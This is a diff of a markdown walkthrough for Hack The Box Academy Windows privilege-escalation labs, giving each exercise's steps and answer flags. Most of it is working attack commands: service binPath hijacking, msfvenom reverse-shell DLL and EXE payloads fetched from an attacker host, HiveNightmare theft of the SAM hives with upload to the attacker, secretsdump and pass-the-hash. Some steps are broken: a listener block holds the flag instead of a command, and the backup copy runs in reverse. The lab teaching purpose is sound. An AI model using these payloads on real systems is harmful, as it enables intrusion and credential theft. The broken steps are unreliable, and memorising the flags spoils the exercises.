@@ -374,7 +374,6 @@ python3 -m http.server 80
 
 Download the files to the target host:
 
-
 ```powershell
 # open a powershell terminal and change the directory for instance to C:\Tools
 cd C:\Tools
@@ -471,4 +470,514 @@ If for some reason you can not read it, copy the file in order to read it.
 
 Results:  Pr1nt_0p3rat0rs_ftw!
 
+
+**RDP to  with user "server_adm" and password "HTB_@cademy_stdnt!". Escalate privileges using the methods shown in this section and submit the contents of the flag located at c:\Users\Administrator\Desktop\ServerOperators\flag.txt**
+
+
+```
+xfreerdp /v:10.129.43.42 /u:server_adm /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+We can confirm that this service starts as SYSTEM using the sc.exe utility.
+
+```powershell
+sc.exe qc AppReadiness
+```
+
+
+**Checking Service Permissions with PsService:** We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.
+
+```powershell
+c:\Tools\PsService.exe security AppReadiness
+```
+
+If we see in the output:
+
+```
+ [ALLOW] BUILTIN\Server Operators
+ ```
+
+This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.
+
+Checking Local Admin Group Membership to confirm that our target account is not present:
+
+```powershell
+net localgroup Administrators
+```
+
+**Modifying the Service Binary Path**: Let's change the binary path to execute a command which adds our current user to the default local administrators group.
+
+```powershell
+sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+**Starting the service fails**, which is expected.
+
+```powershell
+sc.exe start AppReadiness
+```
+
+**Confirming Local Admin Group Membership**:If we check the membership of the administrators group, we see that the command was executed successfully.
+
+```powershell
+net localgroup Administrators
+```
+
+**Confirming Local Admin Access on Domain Controller**: From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.
+
+```
+crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+
+Output:
+
+```
+SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
+```
+
+
+Retrieving NTLM Password Hashes from the Domain Controller:
+
+```bash
+secretsdump.py server_adm@10.129.43.42 -just-dc-user administrator
+```
+
+Returning all ntdi:
+
+```
+crackmapexec smb  10.129.172.26 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --ntds   
+```
+
+Printing the flag:
+
+```
+crackmapexec smb  10.129.172.26 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL -x 'type "c:\Users\Administrator\Desktop\ServerOperators\flag.txt"' --exec-method smbexec
+```
+
+Results: S3rver_0perators_@ll_p0werfull!
+
+
+
+## Attacking the OS
+
+
+**RDP to  with user "sarah" and password "HTB_@cademy_stdnt!". Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished.**
+
+```
+xfreerdp /v:10.129.236.233 /u:sarah /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+
+**Reviewing User Privileges:**
+
+```cmd-session
+whoami /priv
+```
+
+**Confirming UAC is Enabled:**
+
+```cmd-session
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+```
+
+Output:
+
+```
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+EnableLUA    REG_DWORD    0x1
+```
+
+REG_DWORD 0x1: The value 1 means UAC is turned ON.
+
+**Checking UAC Level**:
+
+```cmd-session
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+
+Output:
+
+```
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+```
+
+The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.
+
+**Checking Windows Version:**
+
+```powershell
+[environment]::OSVersion.Version
+```
+
+Output:
+
+```
+
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      14393  0
+```
+
+To match the Build with the version see: [https://en.wikipedia.org/wiki/Windows_10_version_history](https://en.wikipedia.org/wiki/Windows_10_version_history)
+
+
+The 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.
+
+When attempting to locate a DLL, Windows will use the following search order.
+
+1. The directory from which the application loaded.
+2. The system directory `C:\Windows\System32` for 64-bit systems.
+3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
+4. The Windows directory.
+5. Any directories that are listed in the PATH environment variable.
+
+**Reviewing Path Variable**
+
+```powershell
+cmd /c echo %PATH%
+```
+
+This reveals the default folders below.
+
+If we see a folder within the user's profile and writable by the user (in the example, the `WindowsApps` folder), we can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.
+
+**Generating Malicious srrstr.dll DLL**
+
+```shell-session
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+```
+
+**Starting Python HTTP Server on Attack Host**
+
+```shell-session
+sudo python3 -m http.server 8080
+```
+
+**Downloading DLL Target**: Download the malicious DLL to the target system.
+
+```powershell
+curl http://10.10.14.158:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+
+Note that we will be using the path of the writable folder that is included within the PATH variable.
+
+**Starting nc Listener on Attack Host**
+
+```shell-session
+nc -lvnp 8443
+```
+
+**Executing SystemPropertiesAdvanced.exe on Target Host**: Before proceeding, we should ensure that any instances of the rundll32 process from our previous execution have been terminated.
+
+```cmd
+tasklist /svc | findstr "rundll32"
+```
+
+Output:
+
+```cmd
+rundll32.exe                  6300 N/A
+rundll32.exe                  5360 N/A
+rundll32.exe                  7044 N/A
+```
+
+Therefore, killing the processes:
+
+```cmd
+taskkill /PID 7044 /F
+taskkill /PID 6300 /F
+taskkill /PID 5360 /F
+```
+
+Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host (don't forget to previously set the listener):
+
+```cmd
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+Print the flag:
+
+```
+cat c:\Users\sarah\Desktop\flag.txt
+```
+
+Results: I_bypass3d_Uac!
+
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop.**
+
+```
+xfreerdp /v:10.129.54.144 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
+
+```powershell
+.\SharpUp.exe audit
+```
+
+In the example, the tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.
+
+**Checking Permissions with icacls**: Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
+
+```powershell
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+Output:
+
+```
+C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
+                                                     Everyone:(I)(F)
+                                                     NT AUTHORITY\SYSTEM:(I)(F)
+                                                     BUILTIN\Administrators:(I)(F)
+                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+**Replacing Service Binary**:  This service is also startable by unprivileged users.  We will:
+
+1. make a backup of the original binary
+2. Create a malicious binary with msfvenom
+3. Download it in the target host and replace the original
+4. Set a listener
+5. Establish the connection
+
+We can make a backup of the original binary: 
+
+```cmd-session
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+Create  a malicious binary generated with `msfvenom` in out attacking machine:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.158 LPORT=8443 -f exe > SecurityService.exe
+```
+
+Serve the malicious file:
+
+```
+python3 -m http.server 8080
+```
+
+Download it from the target host to the needed location:
+
+```
+curl http://10.10.14.158:8080/SecurityService.exe -O "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+Set a listener:
+
+```bash
+Aud1t_th0se_s3rv1ce_p3rms!
+```
+
+Launch the service and get a reverse shell: 
+
+```powershell
+sc.exe start SecurityService
+```
+
+Print the flag:
+
+```powershell
+type c:\Users\Administrator\Desktop\WeakPerms\flag.txt
+```
+
+Results: Aud1t_th0se_s3rv1ce_p3rms!
+
+
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Try out the 3 examples in this section to escalate privileges to NT AUTHORITY\SYSTEM on the target host. Submit the contents of the flag on the Administrator Desktop.**
+
+```
+xfreerdp /v:10.129.43.13 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+We can check for this vulnerability using icacls to check permissions on the SAM file. 
+
+```cmd-session
+icacls c:\Windows\System32\config\SAM
+```
+
+Output:
+
+```
+C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
+                               NT AUTHORITY\SYSTEM:(I)(F)
+                               BUILTIN\Users:(I)(RX)
+                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+In our case, we have a vulnerable version as the file is readable by the BUILTIN\Users group.
+
+Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.
+
+**Performing Attack and Parsing Password Hashes**:  We will use the POC `https://github.com/GossiTheDog/HiveNightmare`.
+
+```bash
+git clone https://github.com/GossiTheDog/HiveNightmare.git
+cd HiveNightmare/Release
+python3 -m http.server 8080
+```
+
+From the target host:
+
+```
+curl http://10.10.14.158:8080/HiveNightmare.exe -O "C:\Tools\HiveNightmare.exe"      
+```
+
+And now:
+
+```powershell 
+.\HiveNightmare.exe
+```
+
+This will create these copies:
+
+```
+65536 SAM-2021-08-09
+32768 SECURITY-2021-08-09
+12582912 SYSTEM-2021-08-09
+```
+
+Now, we can transfer them yo our attacking machine, for instance by using the PSUpload.ps1 script:
+
+```powershell
+<#
+
+PowerShell Script to upload files using uploadserver module 
+Github: https://github.com/Densaugeo/uploadserver
+
+To execute the server run in your Linux Machine:
+pip3 install uploadserver
+python3 -m uploadserver
+
+Example PS:
+Invoke-FileUpload -File C:\Users\plaintext\Desktop\20200717080254_BloodHound.zip -Uri http://192.168.49.128:8000/upload
+
+References: https://gist.github.com/arichika/91a8b1f60c87512401e320a614099283
+
+#>
+
+function Invoke-FileUpload {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)]
+		[String]$File,
+		
+		[Parameter(Position = 1, Mandatory = $True)]
+		[String]$Uri
+		)
+	
+	$FileToUpload = Get-ChildItem -File "$File"
+	
+	$UTF8woBOM = New-Object "System.Text.UTF8Encoding" -ArgumentList @($false)
+	$boundary = '----BCA246E0-E2CF-48ED-AACE-58B35D68B513'
+	$tempFile = New-TemporaryFile
+	Remove-Item $tempFile -Force -ErrorAction Ignore
+	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
+	$fileName = [System.IO.Path]::GetFileName($FileToUpload.FullName)
+	$sw.Write("--$boundary`r`nContent-Disposition: form-data;name=`"files`";filename=`"$fileName`"`r`n`r`n")
+	$sw.Close()
+	$fs = New-Object System.IO.FileStream($tempFile, [System.IO.FileMode]::Append)
+	$bw = New-Object System.IO.BinaryWriter($fs)
+	$fileBinary = [System.IO.File]::ReadAllBytes($FileToUpload.FullName)
+	$bw.Write($fileBinary)
+	$bw.Close()
+	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
+	$sw.Write("`r`n--$boundary--`r`n")
+	$sw.Close()
+	
+	Invoke-RestMethod -Method POST -Uri $uri -ContentType "multipart/form-data; boundary=$boundary" -InFile $tempFile
+	
+	$FileHash = Get-FileHash -Path "$File" -Algorith MD5 
+	Write-Host "[+] File Uploaded: " $FileToUpload.FullName
+	Write-Host "[+] FileHash: " $FileHash.Hash
+}                                
+
+```
+
+By default, Windows prevents running `.ps1` scripts for security reasons unless explicitly allowed.
+
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+```
+
+Then:
+
+```powershell
+. .\PSUpload.ps1
+```
+
+Now in the attacker machine:
+
+```
+python -m uploadserver
+```
+
+This will create a listening server at port 8000.
+
+And from the target host:
+
+```
+Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SAM-2021-08-09"
+Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SECURITY-2021-08-09"
+Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SYSTEM-2021-08-09"
+```
+
+Now we can use  impacket-secretsdump to extract the hashes:
+
+```shell-session
+secretsdump.py -sam SAM-2021-08-09 -system SYSTEM-2021-08-09 -security SECURITY-2021-08-09 local
+```
+
+And the output:
+
+```
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0xebb2121de07ed08fc7dc58aa773b23d6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
+mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
+hacker:1003:aad3b435b51404eeaad3b435b51404ee:657cc99ace25cc19c7d2902f26fb826d:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461
+dpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56
+[*] NL$KM 
+ 0000   45 C5 B2 32 29 8B 05 B8  E7 E7 E0 4B 2C 14 83 02   E..2)......K,...
+ 0010   CE 2F E7 D9 B8 E0 F0 F8  20 C8 E4 70 DD D1 7F 4F   ./...... ..p...O
+ 0020   42 2C E6 9E AF 57 74 01  09 88 B3 78 17 3F 88 54   B,...Wt....x.?.T
+ 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`
+NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960
+[*] Cleaning up... 
+```
+
+Now we can use other tools for continuing the exploitation. For instance:
+
+```
+crackmapexec smb  10.129.43.13 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --sam  
+```
+
+Print the flag:
+
+```
+crackmapexec smb  10.129.43.13 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL -x  'type "c:\Users\Administrator\Desktop\flag.txt"' --exec-method smbexec
+```
+
+Results: D0nt_fall_b3h1nd_0n_Patch1ng!
 
